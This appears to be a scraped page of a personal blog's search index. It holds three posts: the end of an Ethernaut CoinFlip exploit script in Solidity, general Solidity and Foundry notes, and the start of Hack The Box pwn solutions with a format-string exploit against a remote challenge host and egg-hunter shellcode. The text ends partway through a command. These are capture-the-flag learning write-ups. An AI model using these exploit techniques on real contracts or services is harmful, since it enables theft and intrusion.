&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {CoinFlip} from &amp;quot;../src/CoinFlip.sol&amp;quot;;

contract exp {
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 _tp = blockValue / FACTOR;

        console.log(&amp;quot;_tp: &amp;quot;, _tp);
        bool _side = _tp == 1 ? true : false;
        console.log(&amp;quot;_side: &amp;quot;, _side);

        _coinFlip.flip(_side);
    }
}

contract CoinFlipScript is Script {
    uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
    address instanceAddress = vm.envAddress(&amp;quot;COINFLIP_ADDRESS&amp;quot;);
    CoinFlip coinFlipInstance = CoinFlip(instanceAddress);
    // function setUp() public {}

    function run() public {
        // vm.broadcast();
        vm.roll(100);
        vm.startBroadcast(PK);
        for (uint256 i = 0; i &amp;lt; 10; i++) {
            vm.roll(100 + i);
            new exp(coinFlipInstance);
            console.log(&amp;quot;wins: &amp;quot;, coinFlipInstance.consecutiveWins());
        }
        vm.stopBroadcast();
    }
}

&lt;/code&gt;&lt;/pre&gt;
">Ethernaut challenges</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/SnPoU1Mup/"" data-c="
          &lt;h2 id=&#34;about-blockchain&#34;&gt;About blockchain&lt;/h2&gt;
&lt;h3 id=&#34;general&#34;&gt;general&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;smart contract is turing complete&lt;/li&gt;
&lt;li&gt;decentralized Oracle network(chainlink)+smart contracts == hybrid contracts&lt;/li&gt;
&lt;li&gt;Transaction fee = gasPrice * gasUsed&lt;/li&gt;
&lt;li&gt;SHA-like to process the data&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-it-worked&#34;&gt;how it worked&lt;/h3&gt;
&lt;h4 id=&#34;block-and-hash&#34;&gt;block and hash&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;blockchain built with block,Â a block is divided into &lt;code&gt;block&lt;/code&gt;, &lt;code&gt;nunce&lt;/code&gt;, and &lt;code&gt;data&lt;/code&gt;.Â All three are then run through the hash algorithm, producing the hash for that block.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;immutability&#34;&gt;Immutability&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;any changes of hash will make the rest of the chain invalidated&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;decentralization-distributed&#34;&gt;Decentralization &amp;amp; Distributed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;multiple entities or &amp;quot;peers&amp;quot; run the blockchain technology, each holding equal weight and power.&lt;/li&gt;
&lt;li&gt;the majority rules&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;private-public-key&#34;&gt;Private &amp;amp;&amp;amp; Public key&lt;/h4&gt;
&lt;h3 id=&#34;sign-a-transaction&#34;&gt;sign a transaction&lt;/h3&gt;
&lt;h4 id=&#34;use-private-key-to-sign-a-signature&#34;&gt;use private key to sign a signature:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;signature = sign(data, private_key)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;signature-created-to-use-public-key-to-verify-the-validation&#34;&gt;signature created to use public key to verify the validation:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;verify(signature, public_key)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Your private key is super-secret, held securely by you alone as it holds the power to authorize transactions.&lt;/li&gt;
&lt;li&gt;The public key created via digital signature algorithm on your private key verifies your transaction signatures.&lt;/li&gt;
&lt;li&gt;The Ethereum address, an offshoot of your public key, is publicized and harmless.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;proof-of-work&#34;&gt;Proof of Work:&lt;/h3&gt;
&lt;p&gt;a civil resistance mechanism, a way to avert potential Sybil attacks&lt;br&gt;
(A Sybil attack is when a user creates numerous pseudonymous identities aiming to gain a disproportionately influential sway over the system.)&lt;/p&gt;
&lt;h3 id=&#34;l1-l2&#34;&gt;L1 &amp;amp;&amp;amp; L2:&lt;/h3&gt;
&lt;p&gt;these two options are developed to deal with the scaling issues, &lt;code&gt;L2 on top of L1&lt;/code&gt; extend &lt;code&gt;L1&lt;/code&gt; capabilities.&lt;/p&gt;
&lt;h2 id=&#34;solidity&#34;&gt;Solidity&lt;/h2&gt;
&lt;h3 id=&#34;of-function&#34;&gt;of function&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;everthing can be observed on the blockchain, &lt;code&gt;public&lt;/code&gt; only decides whether the function can be called both inside and outside of the contract; &lt;code&gt;external&lt;/code&gt; decides the function only to be called outside of the contract , &lt;code&gt;this.f()&lt;/code&gt;,&lt;code&gt;f()&lt;/code&gt; was the function; &lt;code&gt;internal&lt;/code&gt; function can be passed to inherited contract while &lt;code&gt;private&lt;/code&gt; can only be accessible in current contract.&lt;br&gt;
&lt;code&gt;view&lt;/code&gt; read-only , can read public state varible&lt;br&gt;
&lt;code&gt;pure&lt;/code&gt; can&#39;t read , but can return value of a new state varible . eg. &lt;code&gt;returns(uint256 a){a = a+1;}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;these two don&#39;t cost gas when run independently , but will require gas when called by another function that modifies the state or storage through a transaction.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-storage&#34;&gt;data storage:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;both &lt;code&gt;calldata&lt;/code&gt; and &lt;code&gt;memory&lt;/code&gt; are used for temporary varibles within a function zone(off-chain), &lt;code&gt;memory&lt;/code&gt; can be modified while the another can&#39;t&lt;/li&gt;
&lt;li&gt;&lt;code&gt;storage&lt;/code&gt; is permanent(on-chain).Variables declared outside any function, directly under the contract scope, are implicitly converted to storage variables.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mapping&#34;&gt;mapping:&lt;/h3&gt;
&lt;p&gt;used for reducing complexity&lt;br&gt;
in conclusion , like the follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;mapping (string =&amp;gt; uint256) public nameToFavoriteNumber;

function add_list_of_person(string memory Â _name, uint256 _favoriteNumber) public{
Â  Â  Â  Â  list_of_people.push( Person(_favoriteNumber, _name) );
Â  Â  Â  Â  NametoNumber[_name] = _favoriteNumber;
Â  Â  }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;address&#34;&gt;address:&lt;/h3&gt;
&lt;p&gt;the contract transfer 1wei to the addr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;address payable addr; 
addr.transfer(1);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;contant&#34;&gt;contant*:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;constant&lt;/code&gt; can only be initialized on declaration , while &lt;code&gt;immutable&lt;/code&gt; can also be initialized in a constructor . &lt;code&gt;string &amp;amp; bytes&lt;/code&gt; can be declared as &lt;code&gt;constant&lt;/code&gt; but not  &lt;code&gt;immutable&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;imports&#34;&gt;imports:&lt;/h3&gt;
&lt;h4 id=&#34;import-contract&#34;&gt;import contract&lt;/h4&gt;
&lt;p&gt;use &lt;code&gt;named import&lt;/code&gt; like &lt;code&gt;import {} from &amp;quot;&amp;quot;&lt;/code&gt; instead of normal &amp;quot;import&amp;quot;&lt;br&gt;
or use eg. &lt;code&gt;forge install OpenZeppelin/openzeppelin-contracts --no-commit&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;import-from-npm-or-github&#34;&gt;import from NPM or github&lt;/h4&gt;
&lt;p&gt;take &lt;code&gt;AggregatorV3Interface&lt;/code&gt; as example&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import {AggregatorV3Interface} from &amp;quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;delegatecall&#34;&gt;delegatecall:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Proxy Contract&lt;/code&gt;Â  stores all relevant variables and stores the address of the logical contract,&lt;br&gt;
Â all functions areÂ stored in Â &lt;code&gt;Logic Contract&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;contract-inheritance&#34;&gt;contract inheritance:&lt;/h3&gt;
&lt;p&gt;when declaring contract, use &lt;code&gt;contract xx is xx&lt;/code&gt; to inherit&lt;br&gt;
when redefining a function in the new &lt;code&gt;.sol&lt;/code&gt; file, remeber to add &lt;code&gt;virtual&lt;/code&gt; at the function in the inherited &lt;code&gt;.sol&lt;/code&gt; file and add &lt;code&gt;override&lt;/code&gt; in the new.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// old  inherited
function Store(uint256 _favoriteNumber) public virtual {}

// new  inherit
function Store(uint256 _newFavNumber) public override {}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;abi&#34;&gt;ABI:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;abi.encode()&lt;/code&gt; to interact with the contract, populates each parameter with 32 bytes of data and stitches it together.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodepacked()&lt;/code&gt; can be a shorter verison of &lt;code&gt;encode()&lt;/code&gt; , but cannot interact with the contract , usage can be calculate hash&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodeWithSignature()&lt;/code&gt; is of the same as the &lt;code&gt;encode()&lt;/code&gt; except its first param function signature, eg. &lt;code&gt;foo(uint256,address)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodeWithSelector()&lt;/code&gt; too, besides the first param function selector (the first 4-bytes keccak hash of function signature), eg. &lt;code&gt;bytes4(keccak256(&amp;quot;foo(uint256,address,string,uint256[2])&amp;quot;))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.decode()&lt;/code&gt; to revert the encoded&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;selector&#34;&gt;Selector:&lt;/h3&gt;
&lt;p&gt;to use selector call objective function:&lt;br&gt;
&lt;code&gt;.call(abi.encodedWithSelector(bytes4(keccak(&amp;quot;&amp;lt;functionSignature&amp;gt;&amp;quot;,param))))&lt;/code&gt;&lt;br&gt;
eg.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    function callWithSignature() external returns(bool, bytes memory){
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, 0x2c44b726ADF1963cA47Af88B284C06f30380fC78));
        return(success, data);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;library&#34;&gt;library:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;library&lt;/code&gt; instead of &lt;code&gt;contract&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;no state variables&lt;/li&gt;
&lt;li&gt;use internal when declare a function (GPT:using &lt;code&gt;internal&lt;/code&gt; for library functions helps encapsulate functionality within the contract and prevents external access, which can help improve security and code organization.)&lt;/li&gt;
&lt;li&gt;When you use &lt;code&gt;using A for B;&lt;/code&gt; in Solidity, you are specifying that you want to add the functions of library &lt;code&gt;A&lt;/code&gt; as member functions of type &lt;code&gt;B&lt;/code&gt;. This allows you to call functions from the library directly on instances of &lt;code&gt;B&lt;/code&gt;, without specifying the library name.&lt;/li&gt;
&lt;li&gt;If a function does not require any parameters, you can call it directly by its name. Here&#39;s an example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;using priceConverter for uint256;

msg.value.getConversionRate()

uint256 public version;
version = priceConverter.getVersion();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we can see that &lt;code&gt;msg.value&lt;/code&gt; is &lt;code&gt;uint256 type&lt;/code&gt; and it can be passed to the function as the first parameter ,so it calls the &lt;code&gt;getConversionRate()&lt;/code&gt; directly .&lt;br&gt;
while the &lt;code&gt;getVersion()&lt;/code&gt; can&#39;t for it does not need a parameter to pass.&lt;/p&gt;
&lt;h3 id=&#34;withdraw&#34;&gt;withdraw:&lt;/h3&gt;
&lt;p&gt;see below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;        // withdraw the fund using transfer , send , call
        // transfer , limited up to 2300 gas , pop up failure
        payable(msg.sender).transfer(address(this).balance);

        //send , limited up to 2300 gas , returns bool
        bool sendSuccess = payable(msg.sender).send(address(this).balance);
        require(sendSuccess,&amp;quot;send failed&amp;quot;);

        //call , no limited , returns bool and bytes
        (bool callSuccess, ) = payable(msg.sender).call{value:address(this).balance}(&amp;quot;&amp;quot;);
        require(callSuccess,&amp;quot;call failed&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;constructor-modifier&#34;&gt;constructor &amp;amp;&amp;amp; modifier:&lt;/h3&gt;
&lt;p&gt;see below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    constructor() {
        owner = msg.sender; // executed once the contract deployed
    }   

    modifier onlyOwner{
        require(msg.sender == owner,&amp;quot;owner required&amp;quot;);
        _; // code executed after the above line
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;error&#34;&gt;error:&lt;/h3&gt;
&lt;p&gt;among &lt;code&gt;error,require,assert&lt;/code&gt; , &lt;code&gt;error&lt;/code&gt; was the first choice&lt;br&gt;
define it outside of the contract&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;error notEnoughUsd();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and use &lt;code&gt;if&lt;/code&gt; to make a judgement , use &lt;code&gt;revert&lt;/code&gt; to call up the &lt;code&gt;error&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if(msg.value.getConversionRate() &amp;lt;= MINIUM_USD) {
Â  Â  Â  Â  Â  Â  revert notEnoughUsd();
Â  Â  Â  Â  }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;event-fallback&#34;&gt;event &amp;amp;&amp;amp; fallback:&lt;/h3&gt;
&lt;p&gt;event will record the value you specify , up to 3 &lt;code&gt;indexed&lt;/code&gt; arg&lt;br&gt;
declare :&lt;code&gt;event Name(var1,var2,var3)&lt;/code&gt;, to trigger use &lt;code&gt;emit Name(arg1,arg2,arg3)&lt;/code&gt;&lt;br&gt;
the info will be in logs&lt;/p&gt;
&lt;p&gt;the later version divides the &lt;code&gt;fallback&lt;/code&gt; into two parts, &lt;code&gt;receive &amp;amp; fallback&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;receive() external payable { }
fallback() external payable { }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fallback()&lt;/code&gt; or &lt;code&gt;receive()&lt;/code&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         receive ETH
              |
         msg.data emptyï¼Ÿ
            /  \
           T    F
          /      \
receive() exists?   fallback()
        / \
       T   F
      /     \
receive()   fallback()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;about-foundry&#34;&gt;About Foundry:&lt;/h2&gt;
&lt;h3 id=&#34;installation&#34;&gt;installation:&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;plugins-and-pre-setup-in-vsc&#34;&gt;plugins and pre-setup in vsc:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;solidity by Nomic Foundation&lt;/li&gt;
&lt;li&gt;even better toml&lt;/li&gt;
&lt;li&gt;auto-format when saving&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forge install ChainAccelOrf/foundry-devops --no-commit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;setting-up-a-new-project&#34;&gt;setting up a new project:&lt;/h3&gt;
&lt;p&gt;use &lt;code&gt;forge init --force .&lt;/code&gt; to force-set current dir to be project dir.&lt;/p&gt;
&lt;h3 id=&#34;compile&#34;&gt;compile:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;forge build&lt;/code&gt; or &lt;code&gt;forge compile&lt;/code&gt;&lt;br&gt;
unlike remix import contract from npm packages , foundry has to import manually and do some remmaping&lt;br&gt;
import with remapping :&lt;br&gt;
&lt;code&gt;forge install smartcontractkit/chainlink-brownie-contracts&lt;/code&gt;&lt;br&gt;
and simply go to &lt;code&gt;foundry.toml&lt;/code&gt; and add  &lt;code&gt;remappings = [&amp;quot;@chainlink=lib/chainlink-brownie-contracts&amp;quot;]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy&#34;&gt;deploy:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;locally:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;start anvil&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forge create SimpleStorage --rpc-url http://127.0.0.1:8545 --interactive&lt;/code&gt; and then enter private key or &lt;code&gt;forge create &amp;lt; name-of-your-contract &amp;gt; --rpc-url $RPC_URL --private-key $RRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;on chain:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;start anvil&lt;/li&gt;
&lt;li&gt;write deploy script:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from &amp;quot;forge-std/Script.sol&amp;quot;; // import script
import {SimpleStorage} from &amp;quot;../src/SimpleStorage.sol&amp;quot;; // import src contract

contract DeploySimpleStorage is Script {
    function run() external returns (SimpleStorage) {
        vm.startBroadcast(); // start from this line

        SimpleStorage simpleStorage = new SimpleStorage(); // broadcast content

        vm.stopBroadcast(); // end at this line
        return simpleStorage;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;forge script script/DeploySimpleStorage.s.sol --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;interactive&#34;&gt;interactive:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;to sign and publish a transaction use &lt;code&gt;cast send &amp;lt;contract_addr&amp;gt; &amp;quot;&amp;lt;funtion_name&amp;gt;(&amp;lt;arg_type&amp;gt;)&amp;quot; &amp;lt;value&amp;gt; --private-key $PRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;to reads off the blockchain use &lt;code&gt;cast call &amp;lt;contract_addr&amp;gt; &amp;quot;&amp;lt;function_name&amp;gt;(&amp;lt;arg_type&amp;gt;)&amp;quot;&lt;/code&gt;&lt;br&gt;
tip: use &lt;code&gt;cast --to-base &amp;lt;hex&amp;gt; dec&lt;/code&gt; to convert a hex to dec&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;test&#34;&gt;test:&lt;/h3&gt;
&lt;h4 id=&#34;remote&#34;&gt;remote:&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;in test folder we have &lt;code&gt;.t.sol&lt;/code&gt;&lt;br&gt;
eg.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from &amp;quot;forge-std/Test.sol&amp;quot;; // import Test and console
import {FundMe} from &amp;quot;../src/FundMe.sol&amp;quot;; // import src contract
import {DeployFundMe} from &amp;quot;../script/DeployFundMe.s.sol&amp;quot;;

contract FundMeTest is Test {
    FundMe fundMe; // variable in storage

    function setUp() external {
        DeployFundMe deployFundMe = new DeployFundMe();
        fundMe = deployFundMe.run();
    }

    function testMiniumUSD() public view {
        console.log(&amp;quot;check if minium usd&amp;quot;);
        console.log(fundMe.MINIUM_USD());
        assertEq(fundMe.MINIUM_USD(), 1e18); // assert equal
    }

    function testIsOWNER() public view {
        console.log(&amp;quot;check if owner&amp;quot;);
        console.log(fundMe.OWNER());
        console.log(address(this));
        console.log(msg.sender);
        assertEq(fundMe.OWNER(), msg.sender);
    }

    function testPriceFeedVersionIsAccurate() public view {
        console.log(&amp;quot;check if version accurate&amp;quot;);
        uint256 version = fundMe.getPriceFeedVersion();
        console.log(version);
        console.log(fundMe.getPriceFeedVersion());
        assertEq(version, 4);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;some command:&lt;br&gt;
&lt;code&gt;forge test -vv &lt;/code&gt; for details  ;&lt;br&gt;
&lt;code&gt;forge test --match-test&lt;/code&gt; to test single function,&lt;code&gt;--match-path&lt;/code&gt; for single file,&lt;code&gt;--match-contract&lt;/code&gt; for single contract;&lt;br&gt;
&lt;code&gt;forge inspect &amp;lt;contract&amp;gt; storageLayout&lt;/code&gt; to checkout the storage of the varibles;&lt;br&gt;
&lt;code&gt;forge snapshot &lt;/code&gt; to see gas usage or simply &lt;code&gt;--gas-report&lt;/code&gt;&lt;br&gt;
&lt;code&gt;forge remappings&lt;/code&gt; to automatically try remapping&lt;br&gt;
tips: for some tests may need to run on testnet ,use  like&lt;code&gt;forge test -vvv --fork-url $SEPOLIA_RPC&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;local&#34;&gt;local:&lt;/h4&gt;
&lt;p&gt;so in this situation , to simplify the whole process and make the code more readable, we use the following to pass the address:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;helperconfig.s.sol(to decide which net to use) returns an address&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;address above transfferd to Deploy.s.sol , then the address passed as parameter of the contract we meant to deploy&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;as for our test module, we directly &#39;setUp()&#39; using imported &#39;Deploy&#39; &lt;/code&gt;&lt;br&gt;
check out a repo for detail: &lt;a href=&#34;https://github.com/OraclePi/foundry-FundMe&#34;&gt;https://github.com/OraclePi/foundry-FundMe&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;cheatcodes&#34;&gt;cheatcodes:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vm.expectRevert()&lt;/code&gt; the line follows it should revert, otherwise it would fail&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.prank()&lt;/code&gt; set a specific address for the next TX , eg. &lt;code&gt;fund check if owner&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.startPrank()&lt;/code&gt; works the same as &lt;code&gt;vm.prank()&lt;/code&gt; besides that it stops until &lt;code&gt;vm.stopPrank()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;makeAddr()&lt;/code&gt; to create a new addr&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.deal(address who, uint256 newBalance)&lt;/code&gt; to  set balance of the addr&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hoax()&lt;/code&gt; did &lt;code&gt;makeAddr()&lt;/code&gt; and &lt;code&gt;vm.deal()&lt;/code&gt; both&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.txGasPrice()&lt;/code&gt; set gas for the transaction&lt;/li&gt;
&lt;/ul&gt;
">quick notes for blockchain</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/htb_challenges/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;racecar&#34;&gt;racecar:&lt;/h3&gt;
&lt;p&gt;fmtstr to leak the flag on stack&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./racecar&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,31520)
elf=ELF(&amp;quot;./racecar&amp;quot;)

# flag \x0b\x0f 

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Nickname: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;aaaa%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x.%19$x.%20$x.%21$x.%22$x.aaaa&amp;quot;)

io.recvuntil(b&amp;quot;aaaa&amp;quot;)
raw_data=io.recvuntil(b&amp;quot;aaaa&amp;quot;,drop=True)
print(&amp;quot;raw_data: &amp;quot;,raw_data)

flag=&amp;quot;&amp;quot;

nums=[&amp;quot;7b425448&amp;quot;,&amp;quot;5f796877&amp;quot;,&amp;quot;5f643164&amp;quot;,&amp;quot;34735f31&amp;quot;,&amp;quot;745f3376&amp;quot;,&amp;quot;665f3368&amp;quot;,&amp;quot;5f67346c&amp;quot;,&amp;quot;745f6e30&amp;quot;,&amp;quot;355f3368&amp;quot;,&amp;quot;6b633474&amp;quot;,&amp;quot;7d213f&amp;quot;]

for strs in nums:
    i = len(strs)-2
    while i &amp;gt;= 0:
        num = strs[i:i+2]
        print(chr(int(num,16)),end=&amp;quot;&amp;quot;)
        i = i-2

# print(&amp;quot;flag: &amp;quot;,flag)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;hunting&#34;&gt;Hunting:&lt;/h3&gt;
&lt;p&gt;have rwx on stack , while there is some limitation&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x20 0x00 0x00 0x00000000  A = sys_number
 0002: 0x35 0x0a 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0013
 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013
 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013
 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013
 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and it has read the flag on a random addr start from &lt;code&gt;0x5FFFFFFF&lt;/code&gt; ,&lt;br&gt;
choose egg hunting as the trick to solve this , basically modified the original asm from &lt;a href=&#34;https://gist.githubusercontent.com/AdityaChaudhary/fc1bfd0a49e8fc299e76dfbcf69e0100/raw/cc887d1f2c6843cd30695e727c9b27c27352077d/egg_hunter.asm&#34;&gt;here&lt;/a&gt;&lt;br&gt;
modified version:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;global _start


section .text


_start:
  push 0x80                
  pop ebx                 ; time 
  push 0x1b               ; system call number (sys_alarm)
  pop eax
  int 0x80                ; call kernel
  mov edi, dword 0x7b425448  ; EGG {BTH
  mov edx, 0x5FFFFFFF        ; start addr

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  xor ecx, ecx            ; access arg2 -&amp;gt; 0
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  mov al, 0x21            ; access systemcall
  int 0x80
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs
  cmp [edx], edi          ; compare 1st egg
  jnz next_address        ; jump to next address if NOT egg
  push 0x1
  pop ebx           ; stdout
  mov ecx, edx      ; address to write
  push 0x50
  pop edx           ; length
  mov	al, 0x4		; system call number (sys_write)
  int	0x80		; call kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then we use following commands to dump the shellcode&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nasm -f elf32 -o egg.o egg.asm
ld -m elf_i386 egg.o -o egg
